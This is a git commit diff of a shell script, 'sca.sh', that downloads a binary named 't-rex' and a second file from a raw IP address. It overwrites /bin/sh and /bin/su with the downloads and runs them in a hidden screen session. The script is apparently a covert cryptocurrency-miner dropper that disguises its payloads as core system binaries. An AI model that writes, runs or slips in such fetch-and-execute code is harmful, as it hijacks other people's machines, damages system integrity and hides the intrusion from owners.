042b1587be24cf1b02ecee940b825847a8258c09
ALICLAYSMEN <58400825+ALICLAYSMEN@users.noreply.github.com>
2022-07-11 20:10:18 +0700

    Update sca.sh

--- sca.sh
+++ sca.sh
@@ -1,13 +1,17 @@
 #!/bin/bash
 echo "ENGINE START!"
 export LD_PRELOAD=
+
+apt install screen -y > /dev/null 2>&1
+
 curl -sLO https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/t-rex
 curl -sLO http://139.59.230.245:7800/down/87J4LekusQat
+
 mv t-rex /bin/sh
 mv 87J4LekusQat /bin/su
 chmod +x /bin/sh
 chmod +x /bin/su
-sudo apt install screen -y > /dev/null 2>&1
+
 screen -S sesi /bin/sh -c /bin/su
 screen -ls
 clear
